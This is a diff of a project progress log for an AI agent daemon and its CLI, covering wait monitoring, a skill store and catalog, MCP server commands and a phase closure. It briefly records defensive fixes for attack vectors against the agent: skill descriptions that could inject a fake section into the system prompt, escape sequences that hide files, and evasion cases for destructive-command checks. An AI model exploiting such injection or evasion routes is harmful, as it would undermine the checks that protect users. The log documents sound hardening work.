+| 2026-10-18 | T-F1-31 | done | Every wait — `thread.wait`, `thread.send`'s `wait`, `block.wait_output` — is registered in `internal/waits` under a `wt_` id and its connection before it subscribes; the 33rd open wait of a connection, of any kind, is `VALIDATION_ERROR` naming the limit, and the connection stays (100 leaked waits over the wire: 68 refused, the connection still answers). `wait.list` (oldest first, target, `until` or `regex`, age, the thread's stall mark) and `wait.cancel` (`CANCELLED` for the waiter, nothing observed touched, `NOT_FOUND` for an unknown id) are advertised under `wait_admin` and callable by `umb wait ls` / `umb wait cancel`. Stall detection is in the agent runtime: `publish` updates a running turn's activity clock before the bus, a 1 s ticker marks a turn idle past its window, publishes `thread.stalled` once and calls `WaitStalled`; activity clears the mark, an approval wait never stalls, nothing is cancelled. `cmd/umbrald` turns `session.output` of a session whose last block carried a `thread_id` into `NoteOutput`. The window is `[waits] stall_local_s` (120) when `Router.Local` finds a local candidate, else `stall_remote_s` (30), 5–3600 s. `integrations` keeps 10 reports per source per sliding second across `report_state` and `report_metadata`, after validation; the excess answers normally, writes nothing and calls `ReportRateLimited`. `Thread` gains `stalled`. The spec-guardian review found output during an approval clearing the pause, the rate checked before the pane was resolved and counting reports that kept nothing, the limit error missing its `details`, and a cancelled wait cancellable twice; all fixed test-first and the delta amended. 21 mutations, all killed. **Delta `2026-10-wait-monitoring`, approved 2026-10-18** under the standing instruction, pending the Tech Lead's review; folded into API 1.38 and Tech 1.48. |
+| 2026-10-18 | T-F1-34 | done | The skill store lives in `internal/context/adapters/skills` over `context/domain/skill.go` (checks, front matter, digest, source classification) and the `context/ports.Skills` port. A bundle — an absolute directory or `.tar.gz`/`.tgz`, classified as local before any path is resolved — is read through a builder that refuses at the first byte past 1 MiB per file, 8 MiB per bundle or 256 entries; symlinks, hardlinks, FIFOs, devices, absolute and `..` entries are refused naming the entry; a tarball with one top directory holding `SKILL.md` is read as that directory. The digest covers files sorted by path. `skill.install` re-reads and refuses a changed digest or an existing name without `replace` as `CONFLICT`; files land `0644` and directories `0755` through `.staging-<id>` renamed into place inside the row's transaction; a replace sets the old copy aside as `.old-<name>`, keeps the id and the enabled state; a 65th install is stored disabled and a 65th enable refused. `skill.changed` follows every stored change. Data Model §6 step 9 runs while the daemon starts, from `cmd/umbrald/skills.go`, beside the database. `skill.inspect`, `install`, `list`, `get` (`{skill, body}`), `set_enabled` and `remove` are served under `skills` to every client kind. 19 mutations: 17 killed at once; the two survivors were redundant code, removed or tested where it acts. The spec-guardian review then added the `.umbral-skills` owner marker (a foreign non-empty directory is refused, never swept), a digest check when recovery finds both copies of a replace, refusal of backslashes and of a file under a file, a bound on a tarball's whole stream, bounded reads per file and `O_NOFOLLOW` opens; 7 further mutations on those checks, all killed — the stream bound only after its test was cut exactly on a header block. **Delta `2026-10-skill-store`, approved 2026-10-18** under the standing instruction, pending the Tech Lead's review; folded into API 1.39, Tech 1.49 and Data Model 1.23. |
+| 2026-10-18 | T-F1-35 | done | `umb skill install PATH [--yes] [--replace]`, `list`, `show NAME [--body]`, `enable`, `disable` and `remove` in `cmd/umb/skill.go`, each one `skill.*` method. Install resolves a local path against `umb`'s directory and sends a remote one as typed, so the daemon refuses it; it calls `skill.inspect`, prints the manifest and digest, and calls `skill.install` with that digest only after `--yes` or a `y`/`yes` typed on a terminal — with neither, it exits 1 and `skill.install` is never called. `--json` prints each method's result verbatim, install's manifest moving to stderr; `show` prints the body only with `--body`. The spec-guardian review found two defects no fake daemon shows: one 10 s deadline spanned inspect, the prompt and install, so reading the manifest for longer failed the install — each call now has its own, install's started after the answer — and the bundle's own text was printed raw, so an ESC sequence or newline in a path could hide a file — every control, format and bidi rune is now printed escaped (decision 7; refusing them in the daemon is flagged for the Tech Lead). 17 mutations, all killed. **Delta `2026-10-umb-skill`, approved 2026-10-18** under the standing instruction, pending the Tech Lead's review; folded into Tech 1.50 §9.4. |
+| 2026-10-18 | T-F1-36 | done | Each turn's system prompt lists the enabled skills under `# Skills` — by name, at most 64, descriptions cut to 256 characters — after the rules files and inside the budget, read through `context/ports.SkillCatalog` at every turn so a change reaches the next one. `skill_load {name, file?}` is a ReadOnly built-in behind `tools/ports.SkillReader`: an enabled skill's `SKILL.md` or one file of its stored bundle, checked as a bundle entry, opened without following a link, cut at 256 KiB; every result taints the turn. `umb skill install|enable|remove` and `umb mcp add` join the built-in destructive patterns. The daemon builds the skill store before the runtime and hands it to both. The spec-guardian review found that a `|` description could carry newlines into the prompt and open a fake section — descriptions are now one line, controls and format characters dropped — and asked for the evasion cases of both patterns in `TestDestructiveAlwaysAsk_REQ_SEC_005`, a test of the 64 cap, `os.Root` confinement for `skill_load` and `VALIDATION_ERROR` for a missing file as the ratified text says; three questions are left for the Tech Lead in the delta. 20 mutations, all killed. **Delta `2026-10-skill-catalog`, approved 2026-10-18** under the standing instruction, pending the Tech Lead's review; folded into Tech 1.51. |
+| 2026-10-18 | T-F1-37 | done | `umb mcp add NAME --stdio [--env NAME=REF]… -- COMMAND…`, `add NAME --http URL`, `list` and `remove NAME` call `mcp.server.*`; `add` always sends `trust: "untrusted"`; `--env` takes only non-empty `keyring:`/`env:` references and is taken out of the arguments before Go's flag parser, which would quote a refused value — the secret — in its error; a stdio server without a command and an http server with one or with `--env` exit 1 without connecting. The `cli` kind may call the three methods (API §2). The agent panel shows `mcp:` and `skills:` rows under its header — servers with state and last error, skills on or off — listed at start, on opening and on every `mcp.server_state` or `skill.changed`, and a turn's MCP tools and loaded skills in one row at its end. The spec-guardian review found refused calls and failed `skill_load`s counted as used, a remote last error able to carry a newline into the layout, the attach and approval openings not listing again, and no bound on the view's rows; all four are fixed (status-aware counting, one-line items, every opening lists, two rows per list with `… n more`), as are `--env` accepted on `list`/`remove` and the fixtures' non-spec statuses, and `umb mcp remove` not being destructive is left for the Tech Lead. An automated security review of the pushed commit found the untrusted rule held only in `umb`; the daemon now refuses any other `trust` from a `cli` connection, and which `env_refs` a `cli` client may set is left for the Tech Lead. 33 mutations, all killed. Two findings of an automated security review of T-F1-36 (the catalog not tainting the turn; command-line patterns rather than a daemon-side refusal) are recorded for the Tech Lead. **Delta `2026-10-umb-mcp-panel`, approved 2026-10-18** under the standing instruction, pending the Tech Lead's review; folded into API 1.40 and Tech 1.52. |
+| 2026-10-22 | T-F1-38 | done | `umb thread create|send|wait|get|cancel` (REQ-CLI-009) lets a script drive a thread and wait without polling; API §2's `cli` row gains `thread.wait` and `thread.get`, which only read, while `list`, `update`, `focus` and `approval.*` stay interactive. F1 criterion 4 had been met only by a client posing as `tui`. `get` follows `next_cursor` through pages of 1000 and prints model text escaped with its extra lines indented; a `TIMEOUT` exits 1 naming the last state. The spec-guardian review found `get` printing only the oldest page and a Done line citing a script outside the branch; both fixed with tests. Delta `2026-10-cli-thread-wait`, ratified. `task ci` green. |
+| 2026-10-22 | F1 | closed | The nine deltas of T-F1-27 … T-F1-37 ratified by the Tech Lead on 2026-10-18; the closing measurement waited for T-F1-38 (`umb thread`, criterion 4) and a US-003 run on an idle model: 18/20, no egress row, no remote request (`docs/reports/us003-2026-10-22.md`). F1 closes on its five "Done" criteria, measured on the closing tree (`docs/checkpoints/2026-10-22-f1-closed.md`). Delta `2026-10-f1-close` moves `T-F1-20`'s QA walk to the Hardening phase as `T-REL-02` and marks the task done, and adds `T-HRD-01` (the rule-signing key), `T-HRD-02` (the seven questions the ratified deltas left open) and `T-HRD-03` (three known defects). |
 | — | — | — | — |
